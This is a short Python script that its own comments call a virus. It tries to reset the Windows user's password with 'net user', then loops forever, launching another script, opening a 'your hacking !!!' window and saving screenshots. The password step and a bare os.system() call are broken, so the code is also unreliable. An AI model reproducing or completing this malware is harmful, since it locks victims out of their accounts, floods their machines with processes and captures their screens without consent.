import os
from tkinter import *
from PIL import ImageGrab



#Install the desired library if a pip is installed on the device.
os.system('pip install pillow')



#Change device password
user = os.environ['USERNAME']
code = 'net user' + user + 'yourhacking!!!@#$$##%$ytyt766'#<password
os.system(code)
os.system()










#Virus start
while True:
    os.startfile("b.py")

    #Build window
    window = Tk()
    window.title('your hacking !!!')
    window.minsize(900,800)
    window.maxsize(900,800)
    Button(window, text='your hacking !!!').pack()
    window.mainloop()

    #Take screenshots of the page and save a lot
    sc = ImageGrab.grab()
    sc.save('your hacking.png')
